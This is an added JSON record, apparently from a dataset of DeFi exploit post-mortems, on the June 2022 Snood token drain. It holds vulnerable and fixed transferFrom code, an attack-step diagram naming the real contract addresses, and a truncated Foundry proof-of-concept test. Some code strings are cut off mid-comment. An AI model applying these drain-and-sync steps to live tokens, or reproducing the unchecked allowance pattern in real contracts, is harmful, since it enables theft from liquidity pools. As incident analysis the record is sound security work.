@@ -1,0 +1,37 @@
+{
+ "id": "2022__2022-06-08_Snood_TransferFromSyncDrain",
+ "source_file": "2022/2022-06-08_Snood_TransferFromSyncDrain.md",
+ "title": "Snood — transferFrom LP Drain + sync Price Manipulation Analysis",
+ "date": "2022-06-08",
+ "protocol": "Snood Token",
+ "chain": "Ethereum Mainnet",
+ "loss_raw": "~$28,000 (WETH)",
+ "loss_usd": 28000.0,
+ "root_cause": "The SNOOD token's `transferFrom()` function does not validate the allowance of the `from` parameter, enabling direct token theft from the LP pool; subsequent `sync()` call manipulates the price to realize WETH profit",
+ "attack_tx": "Block 14,983,660",
+ "vulnerable_contract": "SNOOD Token 0xD45740aB9ec920bEdBD9BAb2E863519E59731941",
+ "classes": [
+  "arbitrary-call"
+ ],
+ "code_before": [
+  "❌ Vulnerable SNOOD transferFrom (pseudocode)\ncontract SnoodToken {\n    mapping(address => uint256) private _balances;\n    mapping(address => mapping(address => uint256)) private _allowances;\n\n    //",
+  "❌ Vulnerability: allowance validation is absent or bypassable\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool) {\n        //",
+  "❌ No validation of _allowances[sender][msg.sender]\n        // Allows draining tokens from an arbitrary sender (LP pool)\n        _balances[sender] -= amount;\n        _balances[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n        return true;\n    }\n}\n\n// Uniswap V2 sync():\n// function sync() external lock {\n//     _update(\n//         IERC20(token0).balanceOf(address(this)),\n//         IERC20(token1).balanceOf(address(this)),\n//         reserve0, reserve1\n//     );\n// }\n// After draining SNOOD, sync() → reserve updated to actual balance (greatly reduced)\n// → On the next swap, SNOOD is treated as extremely cheap → excess WETH paid out\n\n//"
+ ],
+ "code_after": [
+  "✅ Correct ERC20 transferFrom\ncontract SnoodTokenFixed {\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool) {\n        //",
+  "✅ Allowance must be validated\n        uint256 allowed = _allowances[sender][msg.sender];\n        require(allowed >= amount, \"ERC20: insufficient allowance\");\n\n        if (allowed != type(uint256).max) {\n            _allowances[sender][msg.sender] = allowed - amount;\n        }\n        _balances[sender] -= amount;\n        _balances[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n        return true;\n    }\n}"
+ ],
+ "steps": [
+  "getReserves() → (reserveSNOOD, reserveWETH)",
+  "No allowance validation → drain entire SNOOD balance from LP pool",
+  "→ SNOOD/WETH price ratio distorted",
+  "(SNOOD in LP plummets → WETH per SNOOD spikes)",
+  "Swap held SNOOD → WETH",
+  "Based on manipulated reserve → excess WETH received"
+ ],
+ "other_code": [
+  "Attacker\n    │\n    ├─[1] Check SNOOD/WETH LP pool state\n    │       SNOOD LP [0x0F6b0960d2569f505126341085ED7f0342b67DAe]\n    │       getReserves() → (reserveSNOOD, reserveWETH)\n    │\n    ├─[2] ⚡ Call SNOOD.transferFrom(LP_pair, attacker, snoodBalance)\n    │       No allowance validation → drain entire SNOOD balance from LP pool\n    │       LP pool SNOOD balance: drastically reduced\n    │\n    ├─[3] Call SNOOD_LP.sync()\n    │       reserve0(SNOOD) = updated to current balance (drastically reduced)\n    │       reserve1(WETH) = unchanged\n    │       → SNOOD/WETH price ratio distorted\n    │           (SNOOD in LP plummets → WETH per SNOOD spikes)\n    │\n    ├─[4] Calculate optimal swap amount using AMM formula\n    │       amountIn = (2 * reserveSNOOD - sqrt(4*r0*r1)) / 2\n    │       (swap execu",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\n\ninterface ISNOOD {\n    // ⚡ Vulnerable function: transferFrom with no allowance validation\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n}\n\ninterface IUniswapV2Pair {\n    function sync() external;\n    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\n}\n\ncontract ContractTest is Test {\n    ISNOOD         snood   = ISNOOD(0xD45740aB9ec92"
+ ]
+}
